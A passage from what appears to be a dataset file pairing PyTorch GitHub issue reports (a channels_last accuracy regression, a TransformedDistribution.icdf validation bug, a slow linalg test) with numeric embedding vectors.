 -2.55180568e-01  3.08864731e-02 -4.27252203e-01 -4.76000100e-01
 -8.68899748e-02 -2.47495174e-01 -6.77752793e-02 -2.23021328e-01
 -1.82275102e-01 -3.56621087e-01 -1.84561461e-02 -2.05663517e-02
  2.21966460e-01 -2.58961618e-01  2.01022774e-01 -3.14235121e-01
 -4.91696671e-02  4.01886404e-01  2.91324437e-01 -5.44716306e-02
  1.60414368e-01 -3.57589334e-01  3.75216156e-02 -2.35275514e-02
 -1.52113840e-01 -3.51995558e-01  1.56169124e-02 -3.52109849e-01
 -2.82317430e-01  2.42322952e-01  1.57814130e-01 -1.91954389e-01
  1.37592748e-01  1.36779144e-01 -2.53378510e-01  4.39387783e-02
  1.43801272e-01  4.97860253e-01 -5.92182279e-01 -2.43805885e-01
  4.31018293e-01  7.82037824e-02 -9.79506522e-02 -2.88139939e-01
 -3.21693063e-01 -4.56615061e-01 -3.70211124e-01  1.04783639e-01
 -4.69366074e-01  1.33964777e-01 -1.09761707e-01 -2.02658921e-02
 -1.45492684e-02 -1.81097463e-01 -2.19342709e-01 -3.24686825e-01
 -7.06266910e-02 -3.00598234e-01  6.48326457e-01 -7.72339851e-02
 -2.23630980e-01  9.10882577e-02  1.55359030e-01 -7.54467323e-02
  3.18695247e-01 -8.25580880e-02  2.14639589e-01 -1.48617670e-01
  3.79502997e-02 -2.32856244e-01  1.33318052e-01  1.55238628e-01
 -6.91570714e-02  3.36321801e-01 -3.04749966e-01  7.09157437e-02
  6.41141385e-02  1.03349909e-01  3.95889431e-02  3.71114492e-01
  1.36810765e-01  1.91918641e-01  5.10040261e-02  3.15773845e-01
 -1.70260817e-01 -2.56729275e-01  1.17809527e-01 -6.44877478e-02
 -1.84932992e-01 -1.57144532e-01  1.90489605e-01 -1.14695191e-01
  2.63207257e-01  3.68153632e-01 -2.67560303e-01  9.75487605e-02
  4.52527523e-01  4.19970721e-01 -3.11091721e-01  4.44050640e-01
 -2.59618402e-01 -9.88100618e-02 -2.63388939e-02 -1.02923162e-01
 -3.80514830e-01  4.58203219e-02  2.21381366e-01 -2.71861590e-02
  6.51305437e-01  8.44211876e-02 -1.65338084e-01  2.71673381e-01
  6.03750348e-04  3.12673211e-01  5.56777716e-01  1.83510274e-01
  4.03152019e-01 -6.09044433e-01 -1.12540491e-01 -5.49783371e-02
  7.01768100e-02 -1.53119296e-01 -1.92755401e-01 -1.45331860e-01
  5.63814521e-01  2.48378098e-01  2.00979412e-01  2.29432628e-01
 -7.25444481e-02  1.69447601e-01  1.39505953e-01 -1.43022105e-01
 -2.11103633e-01 -3.37203681e-01 -2.85533696e-01 -2.30760247e-01
 -1.71779484e-01 -4.61309433e-01 -1.61001861e-01  1.76081657e-01
  4.51664478e-01 -4.09249723e-01  2.95972854e-01  2.17710495e-01
  1.38617352e-01 -1.35836601e-01 -2.51275420e-01 -1.25397921e-01
 -2.63493180e-01  6.00430727e-01  1.49193965e-03 -3.77499089e-02
  2.03818798e-01 -3.82184505e-01  1.21877812e-01  1.19944915e-01
  7.71353468e-02  9.14885029e-02 -5.52973568e-01 -2.80759692e-01
 -2.74398506e-01  4.92724329e-02  2.07076460e-01 -9.15358961e-02
  1.15117386e-01  1.46156445e-01 -1.45405725e-01  2.35367596e-01
  1.27430528e-01  3.62811506e-01  2.85552859e-01 -1.56531204e-02
 -2.09995672e-01 -2.66612619e-01  2.08926693e-01  1.01687118e-01
  8.70155394e-02  7.29540875e-03  5.00251234e-01  3.30234915e-01
  3.66131872e-01 -2.76805460e-01 -1.61525860e-01 -7.98784196e-02
  1.03903838e-01  2.21904188e-01 -5.19253492e-01  7.47404218e-01
 -1.44121125e-02  5.96272945e-03  2.69281864e-01  3.59818906e-01
 -5.79806902e-02 -3.00183117e-01 -8.82120281e-02  8.49411637e-02
 -8.85725543e-02  1.66188255e-02 -1.97156921e-01  5.14315963e-02
 -2.18104366e-02  4.94296849e-02 -2.45779574e-01  1.68037508e-03
  2.31888026e-01  3.67943466e-01  6.05336279e-02 -4.60836709e-01
  2.52183199e-01 -3.49827670e-02 -2.34458745e-01  4.28114951e-01
  2.62539554e-02  6.83417320e-02  8.34321082e-02  4.84841168e-02]"
channels_last significantly degrades accuracy high priority module: cuda triaged module: regression module: memory format,"## ðŸ› Bug

Moving a simple ResNet model and CIFAR images to channels_last format significantly degrades accuracy (by 6+%).

## To Reproduce

Steps to reproduce the behavior:

1. Download this script: https://gist.github.com/andrewilyas/ac844f3368c97e6d55e40209d2070557
2. Run ``python train.py 1`` and ``python train.py 2`` 
3. The only difference between the two runs is 3 lines that move the images and model to channels_last, but the difference in accuracy is significant (84% for channels_last and 91% for contiguous)

## Expected behavior

The two runs should produce identical results since the only difference between them is the memory format of the model and images.

## Environment

Output of collect_environment.py:

```
PyTorch version: 1.10.0+cu113
Is debug build: False
CUDA used to build PyTorch: 11.3
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.10.2
Libc version: glibc-2.27

Python version: 3.8.0 (default, Nov  6 2019, 21:49:08)  [GCC 7.3.0] (64-bit runtime)
Python platform: Linux-4.15.0-159-generic-x86_64-with-glibc2.10
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration:
GPU 0: A100-PCIE-40GB
GPU 1: A100-PCIE-40GB
GPU 2: A100-PCIE-40GB
GPU 3: A100-PCIE-40GB
GPU 4: A100-PCIE-40GB
GPU 5: A100-PCIE-40GB
GPU 6: A100-PCIE-40GB
GPU 7: A100-PCIE-40GB
GPU 8: A100-PCIE-40GB

Nvidia driver version: 460.91.03
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] msgpack-numpy==0.4.7.1
[pip3] mypy==0.812
[pip3] mypy-extensions==0.4.3
[pip3] numpy==1.20.3
[pip3] torch==1.10.0+cu113
[pip3] torchaudio==0.10.0+cu113
[pip3] torchmetrics==0.5.1
[pip3] torchvision==0.11.1+cu113
[conda] blas                      1.0                         mkl
[conda] cpuonly                   2.0                           0    pytorch
[conda] cudatoolkit               11.2.2               he111cf0_8    conda-forge
[conda] ffmpeg                    4.3                  hf484d3e_0    pytorch
[conda] mkl                       2021.3.0           h06a4308_520
[conda] mkl-service               2.4.0            py38h7f8727e_0
[conda] mkl_fft                   1.3.1            py38hd3c417c_0
[conda] mkl_random                1.2.2            py38h51133e4_0
[conda] numpy                     1.20.3                   pypi_0    pypi
[conda] pytorch-mutex             1.0                         cpu    pytorch
[conda] torch                     1.10.0+cu113             pypi_0    pypi
[conda] torchaudio                0.10.0+cu113             pypi_0    pypi
[conda] torchmetrics              0.5.1                    pypi_0    pypi
[conda] torchvision               0.11.1                   pypi_0    pypi
```


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @ngimel @VitalyFedyunin @jamesr66a",True,"[-1.19969472e-01 -4.37672764e-01 -2.45620683e-01 -4.69625115e-01
 -1.53032780e-01 -3.35703015e-01 -1.99290365e-01  1.56919107e-01
 -4.48459029e-01  8.46972018e-02  3.57419550e-02  3.68587732e-01
  4.09031957e-02  6.41113296e-02 -4.79151189e-01 -8.87674093e-03
 -1.18884496e-01 -6.63290620e-02 -2.63703525e-01  4.83518541e-02
 -3.82617489e-02  1.70204729e-01 -2.85190523e-01  1.61981899e-02
  2.88332343e-01 -1.08460732e-01 -4.56629805e-02 -1.71614408e-01
  1.59394473e-01 -2.54115194e-01  5.26021756e-02  2.14388162e-01
 -6.09855652e-02  2.76996773e-02 -2.09763125e-02  1.86320797e-01
 -3.50755572e-01 -5.55232227e-01 -7.08106309e-02 -9.76103693e-02
  1.13743588e-01  1.25962704e-01 -3.78358588e-02  3.37380394e-02
 -1.40393987e-01 -1.28640383e-01 -2.11214378e-01  1.34192631e-01
  2.28408836e-02 -1.91805873e-03 -1.45375449e-02  2.27442592e-01
 -2.62381077e-01 -8.89438540e-02 -2.47170180e-02 -1.37170002e-01
 -8.45812932e-02  2.74084747e-01 -1.72830701e-01 -5.17329201e-02
  1.10157184e-01  6.32406026e-03  3.01314220e-02 -9.20054093e-02
  9.93643329e-02  3.11791182e-01  8.40962529e-02  8.43880028e-02
  4.73192483e-01  3.11908156e-01  1.37872491e-02  5.15333079e-02
 -3.22996497e-01 -2.62415856e-01  4.16180119e-02 -3.59128229e-03
 -1.39737530e-02  6.15992434e-02 -8.11044201e-02 -7.85942376e-02
  2.91817188e-01 -1.75674826e-01 -9.75242257e-02 -4.18609619e-01
  3.18623364e-01 -1.82856843e-01  1.01836979e-01 -2.12273449e-01
  1.53906733e-01 -2.65056342e-01  4.00444686e-01  2.65152276e-01
  1.55631900e-01  4.83555019e-01  5.77871762e-02  1.66299284e-01
  1.25607580e-01 -2.37216040e-01 -2.90483624e-01 -2.80381106e-02
 -1.13412365e-02 -6.43425584e-02 -1.66775003e-01  2.92454600e-01
  4.83689979e-02 -2.00079620e-01  3.73504937e-01  6.68351874e-02
  1.09389342e-01  1.23434111e-01  1.33232670e-02 -8.51194113e-02
 -1.32350065e-03 -2.39339918e-02  2.99498558e-01 -7.05163553e-02
 -8.95124078e-02  1.02948822e-01 -7.31159896e-02 -1.26518056e-01
 -1.99688554e-01 -6.96219355e-02 -1.45035814e-02  1.87668517e-01
  3.09336007e-01  5.00475883e-01  3.98246706e-01 -4.87601086e-02
 -2.96826154e-01 -2.94035494e-01  1.06440615e-02 -1.07997671e-01
 -1.95896789e-01  1.20271169e-01 -1.24636196e-01  3.34475070e-01
  1.71706647e-01 -2.56386995e-01 -3.83945525e-01 -2.83098787e-01
 -2.04468399e-01  3.31600457e-02  1.32409215e-01 -2.21733809e-01
  8.16456527e-02  3.10088933e-01 -2.53429890e-01 -4.07916494e-04
  4.07762043e-02  2.60779977e-01  1.73311174e-01 -5.70963025e-01
 -2.11621329e-01  7.08123967e-02  1.97556764e-01  4.56704497e-02
  1.95997134e-01 -1.10357376e-02  1.15192756e-01 -4.82175618e-01
  1.69593021e-02  2.45811984e-01 -1.62982196e-02  5.83160073e-02
  1.65722877e-01  2.36940861e-01 -1.76598072e-01 -1.12938814e-01
 -1.76615238e-01  2.70640045e-01 -4.25935924e-01 -9.19138938e-02
  1.08642906e-01 -3.69412899e-01 -1.01476684e-02 -1.48526222e-01
 -5.43106556e-01 -2.09731907e-01  1.52784824e-01 -1.45004988e-01
 -2.00923294e-01  5.63997388e-01  1.85471863e-01  1.22951657e-01
  1.43183857e-01  1.62279338e-01  1.70141831e-01 -1.44111142e-01
 -2.41699275e-02 -3.50511730e-01 -2.47877061e-01 -2.21654549e-01
  1.90986335e-01 -2.02535778e-01  9.16660130e-02 -4.27655987e-02
  3.56979400e-01  3.41117084e-01  1.60823092e-02 -3.39513049e-02
 -2.56826490e-01  2.70595476e-02  1.21801812e-03  1.42228022e-01
  7.27492571e-02 -2.03269571e-01  1.22535616e-01 -2.00543433e-01
  1.85651034e-01  2.37385780e-01 -3.77069443e-01 -7.76485875e-02
 -5.18373847e-02 -1.69469625e-01  3.39573547e-02 -1.90583125e-01
 -3.42019610e-02  1.59586251e-01 -2.36185044e-02  2.21283466e-01
  4.67916727e-02  8.90403837e-02  4.07971650e-01 -3.45305771e-01
 -1.14618376e-01  1.96551561e-01  1.97506130e-01 -4.90196124e-02
 -3.52255166e-01 -1.86078951e-01  2.56140567e-02  6.68079183e-02
  3.47682923e-01 -1.55842751e-02  5.24555072e-02 -6.41478971e-02
  2.64334708e-01 -9.75387692e-02  1.71180278e-01 -6.59999531e-03
 -6.98135346e-02  5.66925667e-02  1.51140124e-01  9.19849984e-03
  3.17560494e-01  2.62485087e-01 -1.75347567e-01  1.22005120e-01
 -2.45704949e-01  1.30933538e-01 -2.92803161e-03 -1.81044757e-01
  2.45590329e-01 -3.05417836e-01  1.70721233e-01 -2.53858507e-01
  1.89618975e-01 -3.05009969e-02 -5.89870848e-04  2.02898994e-01
  4.05526459e-01  5.62885284e-01 -1.80249602e-01  1.12519316e-01
  4.94841188e-01  4.64090526e-01 -1.68053433e-01  3.12311649e-01
  1.89432740e-01 -2.53869712e-01  1.48805052e-01 -3.45163234e-03
  1.40798882e-01 -1.03020575e-03  5.12976348e-01 -1.31672919e-01
  4.18306649e-01 -1.57760471e-01  1.03988022e-01 -6.76517934e-03
  1.68166697e-01  1.21351443e-01 -1.09351061e-01  1.05383173e-01
  1.62845552e-01 -4.48089242e-01 -3.86945575e-01 -2.66942978e-01
 -1.13489881e-01  3.85265872e-02 -5.79527505e-02  1.25183597e-01
  3.12280446e-01 -2.07324959e-02  2.77873650e-02  2.83260643e-01
  1.42079592e-01 -1.69066414e-02  8.95671546e-02 -4.57632422e-01
 -6.37146890e-01  7.94385467e-03  7.66840130e-02 -2.42592953e-02
 -3.99773031e-01  8.78100172e-02 -7.50736296e-02  1.16993450e-01
  3.65809023e-01 -2.10228056e-01  5.03687382e-01 -1.55337870e-01
 -2.17823088e-01  2.00140942e-02  2.45831814e-03  1.02143049e-01
 -2.08052784e-01  2.91328490e-01  9.11431909e-02 -4.65134978e-02
 -3.11359107e-01 -2.12025076e-01 -3.42677593e-01 -5.52361161e-02
  3.46390635e-01  1.21747419e-01 -1.82673097e-01  2.08785012e-01
 -3.50274146e-03  1.36323601e-01  2.78674006e-01  5.08142471e-01
  5.81182204e-02  2.87277311e-01 -9.40254033e-02  7.80379623e-02
 -1.90424860e-01 -2.38569733e-03  7.78446421e-02 -1.79317266e-01
 -1.09369598e-01 -7.19539225e-02 -1.99749112e-01 -3.80559266e-01
 -1.40800774e-01 -2.53679603e-01  5.58792233e-01  6.54347301e-01
  3.72664034e-02 -4.83833134e-01  3.50789465e-02 -8.19097608e-02
 -4.48777154e-02 -4.97603696e-03 -3.51582110e-01  4.95306313e-01
  5.27994871e-01  1.14296414e-02  5.17091602e-02  3.47756296e-01
 -3.47212046e-01 -1.87624216e-01 -5.10107279e-01  1.07783660e-01
  7.36531466e-02 -9.03797522e-02  3.37216228e-01 -1.05986863e-01
  1.39950499e-01  1.75422356e-01 -1.52296081e-01  1.08951874e-01
  1.60209060e-01 -5.16592786e-02  2.65257120e-01 -5.30603230e-01
 -1.69438481e-01  9.02388170e-02 -2.56047398e-01  1.99593991e-01
  1.34306252e-02  2.44924694e-01  1.89627677e-01 -5.08014038e-02]"
Error in icdf method of TransformedDistribution module: distributions triaged OSS contribution wanted,"## ðŸ› Bug

`TransformedDistribution.icdf` should perform validation _after_ applying the inverse transformation rather than before.

## To Reproduce

Running the following snippet
```python
from math import log
import torch

class TorchLogUniform(torch.distributions.TransformedDistribution):
    def __init__(self, lb, ub):
        super(TorchLogUniform, self).__init__(
            torch.distributions.Uniform(lb.log(), ub.log()),
            torch.distributions.ExpTransform(),
        )

lu = TorchLogUniform(torch.tensor(1e8), torch.tensor(1e10))
lu.icdf(torch.tensor(0.1))
```
...produces this error:
```python
...
~/.pyenv/versions/3.9.2/envs/lens-3.9.2/lib/python3.9/site-packages/torch/distributions/distribution.py in _validate_sample(self, value)
    275         assert support is not None
    276         if not support.check(value).all():
--> 277             raise ValueError('The value argument must be within the support')
    278 
    279     def _get_checked_instance(self, cls, _instance=None):

ValueError: The value argument must be within the support
```

## Expected behavior

`icdf` should work for inputs between zero and 1.

The fix is simple: [this validation check](https://github.com/pytorch/pytorch/blob/c371542efc31b1abfe6f388042aa3ab0cef935f2/torch/distributions/transformed_distribution.py#L184) should follow the `for` loop. I'd be happy to submit a PR.

cc @fritzo @neerajprad @alicanb @nikitaved",True,"[-4.04020101e-01 -5.29655069e-02  1.77962974e-01 -1.66813303e-02
  1.18860304e-01 -8.36991891e-02 -1.08756281e-01  2.06699759e-01
 -4.44539905e-01 -6.34602010e-02  1.53303012e-01 -2.62585521e-01
  2.14485705e-01  1.75011437e-03 -1.49398625e-01  2.45207801e-01
 -5.31566858e-01 -3.59034121e-01 -1.98243946e-01  4.83933836e-03
  5.21220088e-01  1.25329554e-01  1.30989015e-01 -6.80654570e-02
  3.97032127e-02  1.38002485e-01 -1.83292150e-01  2.17604171e-03
  3.06249201e-01 -1.34338498e-01  1.32806823e-02  1.94329083e-01
 -5.72112679e-01  1.49592638e-01  1.17700614e-01  2.03370005e-02
 -2.67241836e-01  7.41049424e-02 -3.06571126e-01  1.90088183e-01
  1.01845428e-01  1.61083385e-01  5.89586645e-02 -2.72423849e-02
 -1.84188530e-01 -7.51243308e-02 -8.24146569e-02  7.00950101e-02
 -3.03134203e-01  1.27140269e-01  4.73892689e-01  1.57801479e-01
 -2.28344291e-01 -1.69842467e-01  3.34123969e-01  5.72069176e-02
 -2.04221070e-01 -3.82451564e-02  4.67269868e-01 -4.91845727e-01
  3.14598769e-01  2.81476408e-01 -5.34813821e-01 -1.19517341e-01
 -6.66387156e-02 -2.49791984e-02  1.95024922e-01  2.18851089e-01
  5.11609375e-01  6.20361604e-02 -1.84875578e-01  4.98497263e-02
 -5.81918433e-02  2.81487145e-02  5.44747040e-02  1.49773508e-01
 -4.00034130e-01  3.95349823e-02 -4.93322432e-01 -4.11238790e-01
 -5.58512434e-02  2.65316397e-01 -2.62509912e-01 -5.24873659e-02
  3.01854253e-01  2.25128271e-02  2.22012788e-01 -3.65674078e-01
  9.97767746e-02  6.24462128e-01 -4.65455875e-02 -6.61044270e-02
  3.18342656e-01  1.44047737e-01 -3.75230938e-01  1.78047627e-01
  2.70481795e-01 -1.84428006e-01  6.74268961e-01  7.98315257e-02
 -5.76236546e-02 -3.34164143e-01 -1.80870757e-01 -1.94233581e-02
  2.75056809e-02 -6.17707014e-01  4.87228557e-02  1.74723387e-01
  2.92046368e-01  2.11093172e-01 -4.19665650e-02  1.47003680e-04
  5.35096414e-02  3.05428654e-02  1.28153458e-01 -1.29802927e-01
 -1.82333544e-01  1.61158338e-01 -3.26138258e-01  2.19328687e-01
  3.08056712e-01  3.02851379e-01  2.50364304e-01  3.68727058e-01
  1.25423878e-01  9.07998681e-02 -1.69137627e-01 -3.74193192e-02
 -2.14769971e-02  3.51107985e-01  5.26336432e-02  1.79000929e-01
 -1.23994157e-01  7.94325843e-02  2.99422503e-01  3.20391297e-01
 -1.85688049e-01 -1.17994621e-02 -1.27459124e-01  6.69916451e-01
 -3.80600631e-01 -1.15455732e-01 -1.19274475e-01 -4.68677171e-02
  1.77935660e-01  1.65056944e-01 -9.87384170e-02  1.49006456e-01
  5.61787412e-02  6.91133663e-02  1.65260524e-01 -3.63122642e-01
 -5.08121967e-01 -1.01095587e-01  2.72119284e-01 -1.86746910e-01
  3.56623292e-01  1.52711198e-01  2.34512523e-01 -5.80246672e-02
  1.13083601e-01 -1.48427963e-01  2.72174060e-01 -1.95424989e-01
  4.33446616e-01 -1.51872903e-01 -3.63690555e-01  1.43754482e-01
 -3.81430268e-01 -1.44399852e-01  1.28780574e-01 -2.50932634e-01
  1.24321051e-01  1.43091649e-01  3.50017846e-01 -3.69059861e-01
  7.36751258e-02 -5.25669932e-01 -2.52905548e-01  1.52913406e-01
  4.29770976e-01  2.39097565e-01  5.10930717e-02 -5.97134558e-03
 -1.18528992e-01 -9.56150293e-02  1.03739738e-01 -1.24529870e-02
 -1.48608625e-01  1.04329493e-02 -3.80788147e-01 -2.00774193e-01
  1.98817015e-01  1.30366776e-02  3.04582208e-01 -3.11568618e-01
 -3.08511294e-02 -2.49409020e-01 -1.94227509e-02  1.17189124e-01
 -4.87435997e-01  7.24307597e-02  1.16692349e-01 -3.58846307e-01
  9.30427313e-02  2.94740200e-01 -3.57337654e-01 -3.22743535e-01
 -4.73089278e-01  2.98135072e-01 -4.55918193e-01 -4.53043908e-01
 -7.40664825e-02 -1.55555129e-01 -1.33598506e-01  7.17882514e-02
 -3.00235152e-01 -1.23664038e-02 -1.95301518e-01 -1.24929674e-01
  1.78487092e-01 -1.33283764e-01  5.47179282e-02 -5.25434762e-02
 -3.30119729e-01  4.56709355e-01 -7.97027126e-02 -1.75093710e-01
 -1.44057855e-01  2.84988374e-01  2.07279436e-02 -2.53504980e-03
  3.47140014e-01  1.09471157e-01 -1.75414868e-02  1.20968655e-01
  2.53209323e-01 -2.66014934e-01 -5.42457581e-01 -1.02986842e-01
 -6.35173917e-02  1.05708629e-01 -1.91826627e-01 -3.85243773e-01
 -2.24601507e-01  3.67868394e-01 -1.17428616e-01 -2.23724782e-01
 -4.37405035e-02  1.34969071e-01  1.25654444e-01  4.55740511e-01
  8.58917534e-02  4.09530755e-03  4.06314194e-01  3.85654479e-01
 -4.13551807e-01 -2.38308147e-01 -4.36336808e-02  4.16640267e-02
  1.13652274e-03  2.96264082e-01 -3.27026337e-01  3.81297082e-01
 -2.86296904e-02 -1.20541111e-01 -1.32906690e-01  4.85526025e-03
  9.67630148e-02 -2.27806449e-01 -1.19159892e-02 -4.90654409e-01
  7.56815434e-01  1.25879005e-01  4.38649595e-01  1.86726868e-01
  1.45206451e-01 -1.71789020e-01  1.09749965e-01 -1.78546488e-01
 -5.55385500e-02  3.40920985e-01 -1.25264645e-01 -3.52573730e-02
 -1.73091173e-01 -1.73207045e-01  1.95033103e-02  2.72977382e-01
 -5.17764807e-01 -2.75839955e-01  7.49735534e-02 -3.29542696e-01
  6.81437775e-02 -2.32584029e-01 -2.34258175e-01  1.00197092e-01
  2.47462869e-01 -2.77429044e-01  3.07369590e-01 -1.89283833e-01
  1.37010038e-01  1.58244967e-01  1.79454178e-01  2.34440416e-01
 -2.37216443e-01 -7.78208822e-02  2.55149573e-01  4.03962582e-02
  5.66367447e-01 -3.91472757e-01  4.23627257e-01 -1.41232722e-02
 -1.26408674e-02  1.52975827e-01 -1.18839040e-01 -1.29999906e-01
 -2.82373846e-01 -1.73438303e-02  3.41131449e-01  1.96853876e-01
  1.06163517e-01 -2.97756381e-02 -7.56259635e-03  1.88516647e-01
  1.04089424e-01  1.70941785e-01 -1.55468017e-01 -8.29167664e-02
 -2.55966514e-01 -1.90483518e-02 -1.25747353e-01  1.65728718e-01
  3.07318032e-01  4.20016944e-01 -6.55778870e-02 -2.37493217e-01
 -3.09043471e-02  5.58791578e-01 -8.21016282e-02 -2.34238312e-01
 -1.55441552e-01  4.18962613e-02 -8.28198642e-02 -1.48419887e-01
 -3.72357726e-01 -1.82478711e-01  7.97065049e-02 -2.75946766e-01
 -3.93900424e-01  2.95046754e-02  1.98066533e-01 -1.55032754e-01
 -2.64259696e-01  2.62052536e-01  4.27520648e-03  1.77254230e-01
  2.00712875e-01  1.41358674e-01  5.46480678e-02  5.94641328e-01
 -6.31436519e-03  3.87465090e-01 -4.34940904e-01 -9.22724307e-02
 -2.53713787e-01  2.61463150e-02 -1.22904126e-03 -8.84842202e-02
  6.72637597e-02  1.73905045e-01 -3.98629811e-03  3.99980024e-02
 -2.45081291e-01  1.39449865e-01  4.75568622e-02 -2.53927469e-01
  1.44314319e-02 -4.79258858e-02 -4.72759008e-02  8.28429684e-02
  3.06401253e-01  1.86841898e-02 -1.66570932e-01 -2.20551357e-01]"
test_addr_type_promotion in test_linalg takes too long module: ci module: tests triaged,"test_addr_type_promotion generates tests for all possible dtype triplets (12^3 tests per each device). While cpu tests run quickly, each of ~1700 CUDA tests takes an appreciable amount of time, adding up to more than 2 minutes(compared to ~10 minutes for all of test_linalg). 
On my local run, all of test_linalg
```
----------------------------------------------------------------------
Ran 7545 tests in 590.081s

OK (skipped=1464)
```
filtered only test_addr_type_promotion:
```
----------------------------------------------------------------------
Ran 5184 tests in 157.534s

OK (skipped=728)
```

cc @seemethere @malfet @pytorch/pytorch-dev-infra @mruberry",True,"[-1.52058899e-01 -2.53699452e-01  2.70319358e-02 -6.47406429e-02
 -2.89107502e-01 -2.28089154e-01 -3.83458026e-02 -9.35345516e-03
 -3.45664471e-01 -3.23055625e-01  7.72798434e-02  6.31298497e-02
 -3.98847368e-03 -2.30884701e-01 -1.15503073e-01 -2.61222292e-02
 -7.20573366e-02 -1.12532958e-01 -1.73620924e-01 -1.90834537e-01
 -2.48467416e-01 -3.89157712e-01 -5.14014900e-01  2.73048818e-01
  3.25731397e-01 -2.79779851e-01 -3.82590964e-02  1.24322586e-02
  2.14589536e-01  6.17216974e-02  1.25785455e-01  4.52861845e-01
 -1.91339329e-02 -1.06259339e-01 -3.84630375e-02  2.19239905e-01
 -4.10305798e-01 -1.91920891e-01 -3.21023405e-01 -4.10718098e-02
  1.92994639e-01 -8.92523825e-02 -1.43822521e-01  3.82296622e-01
  6.52359501e-02 -1.30376965e-01 -3.01116467e-01  2.82532841e-01
 -1.65579498e-01  3.17071795e-01 -2.48910040e-02 -2.02200145e-01
  9.25756916e-02 -3.20086360e-01 -4.48742919e-02 -4.98171598e-01
  3.37016284e-01  2.07383454e-01  1.31652176e-01  2.17487440e-01
 -2.56619573e-01 -1.64965928e-01  3.26551497e-04  2.82764345e-01
  2.94061489e-02  9.28039551e-02  1.17237717e-01  2.63393223e-01
  3.40506613e-01  4.34373140e-01 -8.20315927e-02  6.01175427e-03
 -4.10068452e-01 -6.59459978e-02 -9.41908360e-02  7.25201331e-04
 -1.31337851e-01  8.80751573e-03  3.37879449e-01 -3.32925469e-02
  2.28204042e-01 -1.65034551e-02 -1.27084643e-01 -6.72305584e-01
  8.29909518e-02 -1.75908990e-02  5.89531660e-02  2.17067555e-01
  1.74207687e-02 -3.73610854e-01  4.66571420e-01 -6.18974045e-02
 -3.49963427e-01  3.51317316e-01 -9.89519581e-02  3.73108983e-01
  2.50736684e-01 -2.26007447e-01 -2.30106086e-01 -1.35212258e-01
  1.04906827e-01 -3.51380080e-01 -3.90542805e-01  3.51487309e-01
 -6.20218158e-01 -2.10573912e-01  1.93847537e-01 -2.36936659e-03
  1.02204919e-01 -1.15590967e-01  4.52862829e-02 -9.23240110e-02
  1.23629525e-01 -1.17168263e-01  5.58972880e-02  5.34295917e-01
 -9.14556161e-02 -4.59536165e-03  4.36703920e-01  3.78395617e-01
  4.57689390e-02 -2.20719934e-01  2.62103796e-01 -1.08497150e-01
  2.72162497e-01  1.54790968e-01  3.38769823e-01  2.41362482e-01
 -1.79717183e-01  1.45916194e-01  1.59438416e-01  1.78824410e-01
 -1.74192280e-01 -2.17002138e-01  1.19718663e-01  2.07564324e-01
 -5.15238106e-01 -3.31957012e-01  8.49272236e-02 -6.64232373e-02
 -3.16151679e-01  1.84482157e-01  2.04959512e-01  6.43424615e-02
  1.96729198e-01 -9.97934211e-03 -1.02948517e-01  1.77335471e-01
  4.26101536e-02 -3.52883756e-01  3.02977767e-02  2.66613662e-01
 -5.53528070e-02  1.44607365e-01  4.48512435e-01  1.23382144e-01
  1.23388641e-01 -9.99782160e-02 -9.25945044e-02 -4.30526614e-01
 -6.16208017e-02  4.60497797e-01  4.31656614e-02  3.03099096e-01
  2.99764514e-01  2.68524587e-01 -5.63170984e-02  5.05937375e-02
 -1.16497546e-01  3.46286416e-01 -4.20732126e-02 -2.76292741e-01
 -2.97894217e-02 -1.49864167e-01  1.34259298e-01 -2.37654597e-01
 -4.98232245e-01 -2.74924219e-01 -1.38460144e-01  4.92569864e-01
  5.26338816e-02  4.16311622e-01  1.78117305e-01  7.54840851e-01
  1.99917797e-02 -6.02512881e-02  8.96358937e-02 -1.22300752e-01
  3.46770495e-01 -3.42899084e-01 -2.65124291e-01 -3.00751589e-02
  4.68459353e-02 -3.32406424e-02 -2.89069153e-02 -9.05719846e-02
  2.17765272e-01  1.27612457e-01 -1.08089373e-01  1.19028240e-01
 -3.53441477e-01 -1.67428732e-01  1.75287426e-01 -1.80495620e-01
  1.03290476e-01  2.22119570e-01  5.46752736e-02 -2.94610590e-01
  4.07187998e-01  5.92807829e-02 -2.89896190e-01 -1.97782397e-01
  1.66381776e-01 -3.80684465e-01 -4.33364332e-01 -5.21523468e-02
 -1.84845462e-01 -2.64579535e-01  1.10935494e-01  6.27635121e-01
  7.39458874e-02 -1.33810848e-01  2.38171905e-01 -2.90970594e-01
  1.72269940e-02  4.14518043e-02  1.13987014e-01  2.90206999e-01
  1.79744244e-01 -2.49794498e-03 -4.25379053e-02  4.42016840e-01
  3.80889624e-01  2.42555529e-01  2.81564057e-01 -2.65752435e-01
 -2.30996445e-01 -1.27158955e-01  1.81702271e-01  8.97683352e-02
 -2.15741426e-01 -1.89842224e-01  1.92481935e-01 -1.14484392e-01
  2.62598574e-01  3.29385757e-01 -1.78851902e-01 -3.30755770e-01
 -2.29638100e-01 -5.26457578e-02 -1.00963667e-01 -4.14568245e-01
  1.82665318e-01 -4.20202203e-02  3.28614563e-02 -1.77621543e-01
 -1.76203534e-01  4.24929202e-01  2.26022288e-01 -2.17405275e-01
  8.58357072e-01  6.18400574e-01 -1.51897058e-01  5.07979393e-01
  1.71404570e-01  1.74049333e-01 -1.06045038e-01 -1.66281775e-01
 -1.27581090e-01  6.37702122e-02  9.09262374e-02 -3.45049798e-01
  7.92887062e-03  1.28400177e-01  2.69578487e-01 -1.13186836e-01
  2.79519975e-01  2.25177914e-01 -5.30972891e-02 -3.13119441e-01
  1.90591589e-01  9.52037424e-02 -8.61084983e-02  6.38301134e-01
  8.61998126e-02  1.11617669e-02 -2.04357386e-01 -2.70316064e-01
 -2.55509138e-01 -1.56511813e-01 -1.83947444e-01  1.22328669e-01
  1.38820052e-01 -1.43352941e-01 -4.34954822e-01  3.90007585e-01
 -4.04445708e-01 -2.48260438e-01 -1.07458957e-01 -5.60299516e-01
 -5.50157666e-01  6.09403625e-02  6.56159595e-02 -3.55367392e-01
 -4.86925840e-01 -1.62705749e-01  2.10149527e-01  3.97481382e-01
 -1.26683280e-01 -2.30838448e-01  2.90439069e-01  4.36512113e-01
 -6.39974624e-02  1.47902533e-01  1.62018705e-02  1.20884880e-01
